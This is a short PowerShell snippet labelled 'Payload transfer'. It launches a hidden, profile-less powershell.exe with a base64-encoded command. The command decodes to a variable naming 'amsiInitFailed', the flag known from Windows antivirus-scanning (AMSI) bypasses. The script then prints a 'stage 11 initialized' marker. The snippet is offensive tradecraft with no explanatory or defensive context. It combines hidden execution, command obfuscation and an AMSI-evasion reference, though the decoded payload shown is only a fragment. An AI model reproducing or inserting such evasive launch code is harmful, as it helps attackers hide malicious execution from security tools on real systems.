
# Payload transfer
$EncodedCommand = 'JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACIA'
Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoP -EncodedCommand " + $EncodedCommand) -WindowStyle Hidden
Write-Output "stage 11 initialized"
